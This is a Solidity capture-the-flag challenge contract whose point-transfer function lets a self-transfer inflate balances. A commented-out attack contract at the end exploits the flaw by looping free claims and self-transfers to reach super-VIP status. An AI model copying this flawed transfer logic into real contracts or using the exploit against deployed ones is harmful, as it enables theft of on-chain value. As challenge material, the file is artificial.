pragma solidity ^0.4.24;

contract SVip {
    mapping(address => uint) public points;
    mapping(address => bool) public isSuperVip;
    uint256 public numOfFree;

    function promotionSVip() public {
        require(points[msg.sender] >= 999, "Sorry, you don't have enough points");
        isSuperVip[msg.sender] = true;
    }

    function getPoint() public{
        require(numOfFree < 100);
        points[msg.sender] += 1;
        numOfFree++;
    }
    
    function transferPoints(address to, uint256 amount) public {
        uint256 tempSender = points[msg.sender];
        uint256 tempTo = points[to];
        require(tempSender > amount);
        require(tempTo + amount > amount);
        points[msg.sender] = tempSender - amount;
        points[to] = tempTo + amount;
    }

    function isComplete() public view  returns(bool) {
        require(isSuperVip[msg.sender]);
        return true;
    }

}
// contract svipAttack{
//     SVip sv;
//     constructor(address _addr){
//         sv = SVip(_addr);
//     }
//     function get()public{
//         for(uint i =0;i<99;i++){
//             sv.getPoint();
//         }
//     }
//     function transfer()public{
//         for(uint i=0;i<11;i++){
//             sv.transferPoints(address(this),98);
//         }
//         sv.transferPoints(msg.sender,1000);
//     }
// }